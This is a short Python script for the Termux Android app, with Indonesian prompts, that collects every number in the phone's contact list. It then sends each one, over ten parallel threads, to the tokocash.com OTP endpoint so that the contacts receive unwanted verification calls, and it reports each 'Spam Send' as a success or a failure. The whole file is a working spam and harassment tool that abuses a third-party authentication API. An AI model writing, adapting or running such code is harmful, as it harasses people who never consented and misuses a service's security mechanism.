import os
import json
import subprocess
from requests import post
from multiprocessing.pool import ThreadPool

os.system("clear")
print("\t[ TOOLS INI HANYA WORKS DI TERMUX API ]")
print("\t\t[ Author: Deray]\n")

raw_input("[?] Enter Jika Anda Sudah Menginstall Termux Api...")
sucker=[]

for x in json.loads(
     subprocess.check_output(
         ["termux-contact-list"])):
     if " " in x["number"] or "-" in x["number"]:
     	continue
     sucker.append(x)
     
     
def main(x):
	payload={"msisdn":x["number"].replace("+62","0"),
     	"accept":"call"}
	s=post('https://www.tokocash.com/oauth/otp',
     	data=payload).text
	if "otp_attempt_left" in s:
		print("[*] %s -> %s = \033[1;32mSpam Send Success!!\033[0m"%(
     		x["name"],x["number"]))
	else:
		print("[*] %s -> %s = \033[1;37m\033[31mSpam Send Failed!!\033[0m"%(
     		x["name"],x["number"]))

print("[!] MARRY CHRISTMASSSS!!!!")
print("[!] SPAMMING %s CONTACTS!!!"%(len(sucker)))
p=ThreadPool(10)
p.map(main,sucker)
